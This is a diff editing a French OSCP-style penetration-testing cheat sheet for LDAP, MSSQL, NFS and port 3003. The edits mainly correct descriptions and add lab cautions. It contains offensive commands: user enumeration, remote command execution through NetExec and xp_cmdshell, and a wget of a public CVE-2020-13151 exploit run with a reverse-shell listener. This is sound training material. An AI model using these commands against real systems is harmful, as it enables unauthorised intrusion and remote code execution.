@@ -1971,7 +1971,7 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 # Rechercher toutes les unités organisationnelles
 (objectClass=organizationalUnit)
 
-# Recherche de services de certificat d'annuaire actif
+# Rechercher les objets de classe cACertificate ; ce filtre seul n'inventorie pas les autorités AD CS
 (objectClass=cACertificate)
 
 # Rechercher tous les attributs d'un utilisateur spécifique
@@ -1983,7 +1983,7 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 # Rechercher tous les objets dans le répertoire
 (objectClass=*)
 
-# Recherche de comptes de service
+# Rechercher les objets de catégorie serviceAccount si le schéma LDAP la prend en charge
 (objectCategory=serviceAccount)
 
 # Rechercher les comptes membres du groupe indiqué (GroupName)
@@ -1992,8 +1992,8 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 # Rechercher les comptes d’ordinateur
 (objectClass=computer)
 
-# Rechercher des utilisateurs dans une unité organisationnelle spécifique (remplacer 'OU=Users')
-(ou=OU=Users,DC=domain,DC=com)
+# Pour limiter la recherche à une OU, utiliser -b 'OU=Users,DC=domain,DC=com' dans ldapsearch.
+# Le filtre (ou=...) recherche une valeur d'attribut, pas un DN complet.
 
 # Rechercher tous les comptes avec des attributs spécifiques
 (pwdLastSet=0)
@@ -2004,7 +2004,7 @@ kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
 
 Interroger RootDSE pour trouver les contextes de nommage, puis utiliser le DN de base approprié.
 
-<p class="oscp-command-note">Base de l'annuaire LDAP.</p>
+<p class="oscp-command-note">LDAP RootDSE : afficher defaultNamingContext et namingContexts pour identifier le DN de base.</p>
 
 ```bash
 ldapsearch -LLL -x -H ldap://<IP_DC> -s base -b '' defaultNamingContext namingContexts
@@ -2014,7 +2014,7 @@ ldapsearch -LLL -x -H ldap://<IP_DC> -s base -b '' defaultNamingContext namingCo
 
 Lister le nom des comptes exposés à un utilisateur LDAP autorisé.
 
-<p class="oscp-command-note">Objets utilisateurs du domaine.</p>
+<p class="oscp-command-note">LDAP authentifié : lister les attributs sAMAccountName des objets utilisateurs visibles.</p>
 
 ```bash
 ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(objectClass=user)' sAMAccountName
@@ -2024,7 +2024,7 @@ ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(object
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
-<p class="oscp-command-note">Nmap (MS-SQL) : lancer les scripts NSE « ms-sql-info, ms-sql-empty-password, ms-sql-xp-cmdshell ».</p>
+<p class="oscp-command-note">Nmap MSSQL : relever la version et les informations NTLM ; les scripts empty-password et xp-cmdshell ne sont pas exécutés.</p>
 
 ```bash
 nmap -sV -p 1433 --script ms-sql-info,ms-sql-ntlm-info 192.0.2.10
@@ -2034,18 +2034,18 @@ nmap -sV -p 1433 --script ms-sql-info 192.0.2.10
 
 ```
 
-<p class="oscp-command-note">Exécuter la commande distante indiquée via MSSQL avec CrackMapExec (droits requis).</p>
+<p class="oscp-command-note">MSSQL : vérifier l'authentification et, avec les droits requis, exécuter une commande système via NetExec.</p>
 
 ```bash
-# Vérifier les identifiants MSSQL ; l'option -x exécute une commande système, pas une requête SQL
-crackmapexec mssql -d <domain> -u <username> -p <password> -x "whoami" <target_ip>
+# Avec NetExec MSSQL, -x demande l'exécution d'une commande système, pas d'une requête SQL
+nxc mssql 192.0.2.10 -d exemple.local -u utilisateur -p 'MotDePasseTest' -x 'whoami'
 
 # Lister les bases MSSQL via une connexion SQL dédiée (la commande -x précédente n'est pas adaptée)
 # Après connexion avec impacket-mssqlclient, saisir : SELECT name FROM sys.databases;
 
 ```
 
-<p class="oscp-command-note">MSSQL : se connecter à l'instance SQL avec le compte autorisé.</p>
+<p class="oscp-command-note">MSSQL avec sqsh : ouvrir une session SQL avec un compte autorisé ; éviter de laisser un mot de passe en clair dans l'historique.</p>
 
 ```bash
 # Se connecter à MSSQL avec sqsh sous Linux (client installé requis)
@@ -2056,7 +2056,7 @@ sqsh -S <target_ip> -U <domain>\\<username> -P <password> -D <database>
 
 ```
 
-<p class="oscp-command-note">Instruction SQL dans la rubrique « 1433: MSSQL ».</p>
+<p class="oscp-command-note">MSSQL : exemple de configuration xp_cmdshell ; cette modification est sensible et exige des droits élevés.</p>
 
 ```sql
 -- Activer les options avancées et xp_cmdshell (modifie la configuration du serveur ; droits élevés requis)
@@ -2115,7 +2115,7 @@ DELETE FROM <table_name> WHERE <condition>;
 
 Vérifier le type d'authentification demandé par l'instance MSSQL.
 
-<p class="oscp-command-note">Client SQL Server avec authentification Windows.</p>
+<p class="oscp-command-note">Impacket MSSQLClient : se connecter avec l'authentification Windows d'un compte de domaine autorisé.</p>
 
 ```bash
 impacket-mssqlclient '<DOMAINE>/<UTILISATEUR>:<MOT_DE_PASSE>@<IP_CIBLE>' -windows-auth
@@ -2123,7 +2123,7 @@ impacket-mssqlclient '<DOMAINE>/<UTILISATEUR>:<MOT_DE_PASSE>@<IP_CIBLE>' -window
 
 ### 2049: NFS
 
-<p class="oscp-command-note">Nmap (NFS) : lancer les scripts NSE « nfs-showmount, nfs-ls, nfs-statfs ».</p>
+<p class="oscp-command-note">Nmap NFS : interroger les exports, les fichiers accessibles et les statistiques NFS via les scripts NSE.</p>
 
 ```bash
 nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <IP_CIBLE>
@@ -2141,7 +2141,7 @@ showmount -a <IP_CIBLE>
 
 ```
 
-<p class="oscp-command-note">Créer un répertoire.</p>
+<p class="oscp-command-note">NFS : créer un point de montage local puis monter un export NFSv3 en lecture seule.</p>
 
 ```bash
 # Créer un répertoire local pour monter le partage NFS
@@ -2154,30 +2154,28 @@ sudo mount -t nfs -o ro,vers=3 <IP_CIBLE>:/export/partage /mnt/partage_nfs
 
 ### 3003: CGMS (possible)
 
-<p class="oscp-command-note">Netcat/Telnet : établir la connexion TCP au service «CGMS (possible)».</p>
+<p class="oscp-command-note">TCP 3003 : ouvrir une connexion Netcat ; identifier le protocole avant d'essayer des commandes internes.</p>
 
-```bash
-# Connexion au service
-nc -nv <target_ip> 3003
+```text
+# Depuis un terminal : ouvrir une connexion TCP
+nc -nv 192.0.2.10 3003
 
-# Afficher les commandes disponibles après connexion au service
+# Dans la session, uniquement si le service accepte ces commandes :
 help
-
-# Demander la version du service si la commande version est prise en charge
 version
 
 ```
 
-<p class="oscp-command-note">Télécharger une ressource distante.</p>
+<p class="oscp-command-note">CGMS : exemple historique de téléchargement d'un script tiers ; vérifier la source, le CVE et les arguments avant tout usage en laboratoire.</p>
 
 ```bash
-# Télécharger le script d'exploitation
+# Télécharger le script tiers uniquement après vérification de son contenu
 wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py
 
-# Exécuter le script avec les paramètres appropriés
+# Exemple historique : vérifier la compatibilité du script et des options avant exécution
 python3 cve2020-13151.py --ahost=<target_ip> --aport=3000 --pythonshell --lhost=<local_ip> --lport=443
 
-# Écouteur Netcat sur une machine de laboratoire autorisée
+# Démarrer l'écouteur sur une machine de laboratoire autorisée avant le test
 nc -nlvp 443
 
 ```
